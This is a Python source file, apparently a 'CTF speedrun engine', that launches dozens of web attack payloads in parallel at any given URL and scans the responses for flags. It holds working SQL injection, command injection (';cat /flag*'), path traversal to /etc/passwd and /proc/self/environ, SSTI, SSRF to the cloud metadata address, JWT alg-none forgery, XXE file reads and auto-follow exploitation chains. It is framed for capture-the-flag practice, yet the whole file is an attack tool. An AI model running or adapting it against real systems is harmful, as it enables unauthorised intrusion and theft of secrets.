"""
CTF速通引擎 v2.0 — 极限速度模式
设计目标：简单CTF <10秒，复杂CTF <2分钟
策略：10+payload并行发射 → 哪个先中就用哪个 → 自动深入
"""
import asyncio
import re
import json
import time
import httpx
from urllib.parse import urljoin, urlparse, parse_qs
from dataclasses import dataclass, field
from typing import Optional, Dict, List, Any

# ─── 数据结构 ───────────────────────────────────────────

@dataclass
class Hit:
    """命中的漏洞"""
    url: str
    category: str          # sqli / idor / lfi / ssti / cmdi / ssrf / logic / leak
    payload: str
    response_snippet: str  # 关键回显
    confidence: float      # 0-1
    elapsed_ms: float      # 耗时
    extra: Dict = field(default_factory=dict)

@dataclass 
class SpeedResult:
    url: str
    flag: Optional[str] = None
    hits: List[Hit] = field(default_factory=list)
    total_ms: float = 0
    attack_chain: List[str] = field(default_factory=list)

# ─── 并行Payload库 ──────────────────────────────────────

# 10大类payload，每类多个变体，全部并行发射
PAYLOADS = {
    # 1. SQL注入 — 登录绕过 + UNION
    "sqli": [
        {"name": "sqli_auth_bypass", "method": "POST", "path": "/login", "data": {"username": "admin'--", "password": "x"}, "expect": r"(?i)(welcome|dashboard|success|logout)", "auto_follow": True},
        {"name": "sqli_union_tables", "method": "GET", "path": "/", "param": "id", "value": "' UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--", "expect": r"(?i)(flag|secret|users|admin)", "auto_follow": True},
        {"name": "sqli_union_flag", "method": "GET", "path": "/", "param": "id", "value": "' UNION SELECT flag FROM flags--", "expect": r"(?i)(CTF\{|flag\{)", "auto_follow": False},
        {"name": "sqli_union_flag2", "method": "GET", "path": "/", "param": "id", "value": "' UNION SELECT flag_value FROM flags--", "expect": r"(?i)(CTF\{|flag\{)", "auto_follow": False},
        {"name": "sqli_union_secret", "method": "GET", "path": "/", "param": "id", "value": "' UNION SELECT secret FROM secrets--", "expect": r"(?i)(CTF\{|flag\{|secret)", "auto_follow": False},
        {"name": "sqli_oracle_flag", "method": "GET", "path": "/", "param": "id", "value": "' UNION SELECT flag FROM dual--", "expect": r"(?i)(CTF\{|flag\{)", "auto_follow": False},
        {"name": "sqli_error_based", "method": "GET", "path": "/", "param": "id", "value": "' AND extractvalue(1,concat(0x7e,(SELECT flag FROM flags LIMIT 1)))--", "expect": r"(?i)(CTF\{|flag\{|~)", "auto_follow": False},
    ],
    # 2. IDOR / 未授权API
    "idor": [
        {"name": "idor_users", "method": "GET", "path": "/api/users", "expect": r"(?i)(username|password|flag|role)", "auto_follow": True},
        {"name": "idor_me", "method": "GET", "path": "/api/me", "expect": r"(?i)(username|flag|balance)", "auto_follow": True},
        {"name": "idor_admin", "method": "GET", "path": "/api/admin", "expect": r"(?i)(flag|secret|admin)", "auto_follow": False},
        {"name": "idor_flag", "method": "GET", "path": "/api/flag", "expect": r"(?i)(CTF\{|flag\{)", "auto_follow": False},
        {"name": "idor_transactions", "method": "GET", "path": "/api/transactions", "expect": r"(?i)(flag|id|amount)", "auto_follow": True},
        {"name": "idor_config", "method": "GET", "path": "/api/config", "expect": r"(?i)(flag|secret|key)", "auto_follow": False},
        {"name": "idor_debug", "method": "GET", "path": "/api/debug", "expect": r"(?i)(flag|env|config)", "auto_follow": False},
    ],
    # 3. 敏感文件泄露
    "leak": [
        {"name": "leak_env", "method": "GET", "path": "/.env", "expect": r"(?i)(SECRET|FLAG|DB_|KEY)", "auto_follow": False},
        {"name": "leak_flag_txt", "method": "GET", "path": "/flag.txt", "expect": r"(?i)(CTF\{|flag\{)", "auto_follow": False},
        {"name": "leak_flag", "method": "GET", "path": "/flag", "expect": r"(?i)(CTF\{|flag\{)", "auto_follow": False},
        {"name": "leak_git_config", "method": "GET", "path": "/.git/config", "expect": r"(?i)(url|remote)", "auto_follow": True},
        {"name": "leak_backup", "method": "GET", "path": "/backup", "expect": r"(?i)(CTF\{|flag\{|sql)", "auto_follow": False},
        {"name": "leak_robots", "method": "GET", "path": "/robots.txt", "expect": r"(?i)(disallow|flag|admin)", "auto_follow": True},
        {"name": "leak_sitemap", "method": "GET", "path": "/sitemap.xml", "expect": r"(?i)(flag|admin|secret)", "auto_follow": True},
        {"name": "leak_readme", "method": "GET", "path": "/README.md", "expect": r"(?i)(flag|password|secret)", "auto_follow": False},
    ],
    # 4. SSTI模板注入
    "ssti": [
        {"name": "ssti_config", "method": "GET", "path": "/", "param": "name", "value": "{{config}}", "expect": r"(?i)(SECRET|FLAG|Config)", "auto_follow": False},
        {"name": "ssti_self", "method": "GET", "path": "/", "param": "name", "value": "{{self.__init__.__globals__}}", "expect": r"(?i)(flag|FLAG|secret)", "auto_follow": False},
        {"name": "ssti_7x7", "method": "GET", "path": "/", "param": "name", "value": "${{7*7}}", "expect": r"49", "auto_follow": True},
        {"name": "ssti_jinja_dump", "method": "GET", "path": "/", "param": "name", "value": "{{''.__class__.__mro__[1].__subclasses__()}}", "expect": r"(?i)(subprocess|os|file)", "auto_follow": True},
    ],
    # 5. 命令注入
    "cmdi": [
        {"name": "cmdi_id", "method": "GET", "path": "/", "param": "cmd", "value": ";id", "expect": r"uid=", "auto_follow": True},
        {"name": "cmdi_ls", "method": "GET", "path": "/", "param": "cmd", "value": "|ls -la", "expect": r"(?i)(flag|total)", "auto_follow": True},
        {"name": "cmdi_cat_flag", "method": "GET", "path": "/", "param": "cmd", "value": ";cat /flag*", "expect": r"(?i)(CTF\{|flag\{)", "auto_follow": False},
        {"name": "cmdi_find_flag", "method": "GET", "path": "/", "param": "cmd", "value": "`find / -name 'flag*' 2>/dev/null`", "expect": r"(?i)(flag)", "auto_follow": True},
        {"name": "cmdi_pipe_cat", "method": "GET", "path": "/", "param": "ip", "value": "127.0.0.1;cat flag.txt", "expect": r"(?i)(CTF\{|flag\{)", "auto_follow": False},
    ],
    # 6. LFI 本地文件包含
    "lfi": [
        {"name": "lfi_passwd", "method": "GET", "path": "/", "param": "file", "value": "../../../../etc/passwd", "expect": r"root:", "auto_follow": True},
        {"name": "lfi_flag", "method": "GET", "path": "/", "param": "file", "value": "../../../flag.txt", "expect": r"(?i)(CTF\{|flag\{)", "auto_follow": False},
        {"name": "lfi_env", "method": "GET", "path": "/", "param": "file", "value": "../../.env", "expect": r"(?i)(FLAG|SECRET|DB_)", "auto_follow": False},
        {"name": "lfi_proc", "method": "GET", "path": "/", "param": "file", "value": "/proc/self/environ", "expect": r"(?i)(FLAG|flag)", "auto_follow": False},
        {"name": "lfi_php_wrapper", "method": "GET", "path": "/", "param": "file", "value": "php://filter/convert.base64-encode/resource=flag.php", "expect": r"PD9waHA", "auto_follow": True},
    ],
    # 7. SSRF
    "ssrf": [
        {"name": "ssrf_localhost", "method": "GET", "path": "/", "param": "url", "value": "http://localhost/flag", "expect": r"(?i)(CTF\{|flag\{)", "auto_follow": False},
        {"name": "ssrf_127", "method": "GET", "path": "/", "param": "url", "value": "http://127.0.0.1/admin", "expect": r"(?i)(flag|admin|secret)", "auto_follow": True},
        {"name": "ssrf_metadata", "method": "GET", "path": "/", "param": "url", "value": "http://169.254.169.254/latest/meta-data/", "expect": r"(?i)(ami|instance)", "auto_follow": True},
        {"name": "ssrf_file", "method": "GET", "path": "/", "param": "url", "value": "file:///flag.txt", "expect": r"(?i)(CTF\{|flag\{)", "auto_follow": False},
    ],
    # 8. 业务逻辑
    "logic": [
        {"name": "logic_negative_transfer", "method": "POST", "path": "/api/transfer", "data": {"to": "attacker", "amount": "-999999"}, "expect": r"(?i)(success|transferred|ok)", "auto_follow": True},
        {"name": "logic_negative_amount", "method": "POST", "path": "/api/transfer", "data": {"to": "self", "amount": "-999999"}, "expect": r"(?i)(success|transferred|ok)", "auto_follow": True},
        {"name": "logic_price_tamper", "method": "POST", "path": "/api/buy", "data": {"item": "flag", "price": "0"}, "expect": r"(?i)(CTF\{|flag\{|purchased)", "auto_follow": False},
        {"name": "logic_role_bypass", "method": "POST", "path": "/api/update_profile", "data": {"role": "admin"}, "expect": r"(?i)(admin|success)", "auto_follow": True},
    ],
    # 9. JWT / Token攻击
    "jwt": [
        {"name": "jwt_none", "method": "GET", "path": "/api/me", "header": "Authorization", "value": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.", "expect": r"(?i)(admin|flag|username)", "auto_follow": True},
        {"name": "jwt_alg_none", "method": "GET", "path": "/api/admin", "header": "Authorization", "value": "Bearer eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.", "expect": r"(?i)(flag|admin|secret)", "auto_follow": False},
    ],
    # 10. XXE
    "xxe": [
        {"name": "xxe_file", "method": "POST", "path": "/api/xml", "data_raw": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]><root>&xxe;</root>', "content_type": "application/xml", "expect": r"(?i)(CTF\{|flag\{)", "auto_follow": False},
        {"name": "xxe_env", "method": "POST", "path": "/api/xml", "data_raw": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///.env">]><root>&xxe;</root>', "content_type": "application/xml", "expect": r"(?i)(FLAG|SECRET|DB_)", "auto_follow": False},
    ],
}

# 自动深入：某个payload命中后，自动发射后继payload
AUTO_FOLLOW = {
    "sqli_auth_bypass": [
        {"name": "sqli_follow_flag", "method": "GET", "path": "/", "param": "id", "value": "' UNION SELECT flag FROM flags--"},
        {"name": "sqli_follow_tables", "method": "GET", "path": "/", "param": "id", "value": "' UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--"},
    ],
    "lfi_passwd": [
        {"name": "lfi_follow_flag", "method": "GET", "path": "/", "param": "file", "value": "../../../flag.txt"},
        {"name": "lfi_follow_env", "method": "GET", "path": "/", "param": "file", "value": "../../.env"},
    ],
    "cmdi_id": [
        {"name": "cmdi_follow_cat", "method": "GET", "path": "/", "param": "cmd", "value": ";cat /flag*"},
        {"name": "cmdi_follow_find", "method": "GET", "path": "/", "param": "cmd", "value": ";find / -name 'flag*' -exec cat {} \\; 2>/dev/null"},
    ],
    "idor_users": [
        {"name": "idor_follow_flag", "method": "GET", "path": "/api/flag"},
        {"name": "idor_follow_admin", "method": "GET", "path": "/api/admin"},
    ],
    "ssti_7x7": [
        {"name": "ssti_follow_config", "method": "GET", "path": "/", "param": "name", "value": "{{config}}"},
        {"name": "ssti_follow_rce", "method": "GET", "path": "/", "param": "name", "value": "{{''.__class__.__mro__[1].__subclasses__()}}"},
    ],
}

# ─── Flag提取正则 ──────────────────────────────────────

FLAG_PATTERNS = [
    r'CTF\{[^}]+\}',
    r'flag\{[^}]+\}',
    r'FLAG\{[^}]+\}',
    r'ctf\{[^}]+\}',
    r'Flag\{[^}]+\}',
]

# ─── 核心引擎 ──────────────────────────────────────────

class CTFSpeedrun:
    """CTF速通引擎 — 并行发射，极速夺旗"""
    
    def __init__(self, base_url: str, timeout: float = 5.0):
        self.base_url = base_url.rstrip('/')
        self.timeout = timeout
        self.client: Optional[httpx.AsyncClient] = None
        self.cookies: Dict[str, str] = {}
        self.hits: List[Hit] = []
        self.flag: Optional[str] = None
        self.start_time = time.time()
        
    def _build_requests(self) -> List[Dict]:
        """从PAYLOADS库构建所有请求"""
        requests = []
        for category, payloads in PAYLOADS.items():
            for p in payloads:
                req = {
                    "category": category,
                    "name": p["name"],
                    "method": p.get("method", "GET"),
                    "url": urljoin(self.base_url, p.get("path", "/")),
                    "expect": p.get("expect", ""),
                    "auto_follow": p.get("auto_follow", False),
                }
                # 参数
                if "param" in p:
                    req["params"] = {p["param"]: p["value"]}
                if "header" in p:
                    req["headers"] = {p["header"]: p["value"]}
                # POST body
                if "data" in p:
                    req["data"] = p["data"]
                if "data_raw" in p:
                    req["data_raw"] = p["data_raw"]
                    req["content_type"] = p.get("content_type", "text/xml")
                requests.append(req)
        return requests
    
    async def _fire_one(self, client: httpx.AsyncClient, req: Dict) -> Optional[Hit]:
        """发射单个payload"""
        t0 = time.time()
        try:
            url = req["url"]
            method = req.get("method", "GET")
            kwargs = {"timeout": self.timeout, "follow_redirects": True}
            
            if "params" in req:
                kwargs["params"] = req["params"]
            if "data" in req:
                kwargs["data"] = req["data"]
            if "data_raw" in req:
                kwargs["content"] = req["data_raw"]
                if "content_type" in req:
                    kwargs["headers"] = {"Content-Type": req["content_type"]}
            if "headers" in req:
                kwargs.setdefault("headers", {}).update(req["headers"])
            if self.cookies:
                kwargs["cookies"] = self.cookies
            
            if method == "GET":
                resp = await client.get(url, **kwargs)
            else:
                resp = await client.post(url, **kwargs)
            
            elapsed = (time.time() - t0) * 1000
            text = resp.text
            
            # 先检查flag
            flag = self._extract_flag(text)
            if flag:
                return Hit(
                    url=url,
                    category=req["category"],
                    payload=req["name"],
                    response_snippet=flag,
                    confidence=1.0,
                    elapsed_ms=elapsed,
                    extra={"flag": flag, "resp_text": text[:500]}
                )
            
            # 检查期望模式
            expect = req.get("expect", "")
            if expect:
                if re.search(expect, text):
                    snippet = text[:300]
                    # 提取匹配的行
                    matched_lines = [l for l in text.split('\n') if re.search(expect, l, re.IGNORECASE)]
                    if matched_lines:
                        snippet = '\n'.join(matched_lines[:10])
                    
                    return Hit(
                        url=url,
                        category=req["category"],
                        payload=req["name"],
                        response_snippet=snippet,
                        confidence=0.7,
                        elapsed_ms=elapsed,
                        extra={"resp_text": text[:500]}
                    )
            
            return None
            
        except Exception as e:
            return None
    
    def _extract_flag(self, text: str) -> Optional[str]:
        """从响应中提取flag"""
        for pattern in FLAG_PATTERNS:
            m = re.search(pattern, text)
            if m:
                return m.group(0)
        return None
    
    async def _auto_follow(self, client: httpx.AsyncClient, hit: Hit):
        """命中后自动深入"""
        follow_payloads = AUTO_FOLLOW.get(hit.payload, [])
        for fp in follow_payloads:
            try:
                req = {
                    "name": fp["name"],
                    "method": fp["method"],
                    "url": urljoin(self.base_url, fp.get("path", "/")),
                    "params": {fp["param"]: fp["value"]} if "param" in fp else None,
                }
                kwargs = {"timeout": self.timeout, "follow_redirects": True}
                if req["params"]:
                    kwargs["params"] = req["params"]
                if self.cookies:
                    kwargs["cookies"] = self.cookies
                
                resp = await client.get(req["url"], **kwargs)
                flag = self._extract_flag(resp.text)
                if flag:
                    self.flag = flag
                    self.hits.append(Hit(
                        url=req["url"],
                        category="auto_follow",
                        payload=fp["name"],
                        response_snippet=flag,
                        confidence=1.0,
                        elapsed_ms=0,
                        extra={"flag": flag}
                    ))
                    return
            except:
                pass
    
    async def speedrun(self) -> SpeedResult:
        """执行速通 — 并行发射所有payload"""
        self.start_time = time.time()
        self.client = httpx.AsyncClient(timeout=self.timeout, verify=False)
        
        requests = self._build_requests()
        result = SpeedResult(url=self.base_url)
        
        # Phase 1: 并行发射全部payload
        tasks = [self._fire_one(self.client, req) for req in requests]
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        
        # 收集hits
        for resp in responses:
            if isinstance(resp, Hit):
                self.hits.append(resp)
                if resp.extra.get("flag"):
                    self.flag = resp.extra["flag"]
                    break  # 拿到flag立即停
        
        # Phase 2: 如果没有直接拿到flag，对命中做自动深入
        if not self.flag:
            for hit in self.hits[:5]:  # 最多追5个命中
                if hit.extra.get("flag"):
                    break
                await self._auto_follow(self.client, hit)
                if self.flag:
                    break
        
        await self.client.aclose()
        
        result.flag = self.flag
        result.hits = self.hits
        result.total_ms = (time.time() - self.start_time) * 1000
        
        # 构建攻击链
        for h in self.hits:
            result.attack_chain.append(f"[{h.category}] {h.payload} → {h.response_snippet[:80]}")
        if self.flag:
            result.attack_chain.append(f"🏁 FLAG: {self.flag}")
        
        return result


# ─── 便捷函数 ──────────────────────────────────────────

async def ctf_speedrun(url: str, timeout: float = 5.0) -> SpeedResult:
    """CTF速通入口"""
    runner = CTFSpeedrun(url, timeout)
    return await runner.speedrun()


def ctf_speedrun_sync(url: str, timeout: float = 5.0) -> SpeedResult:
    """同步包装"""
    return asyncio.run(ctf_speedrun(url, timeout))
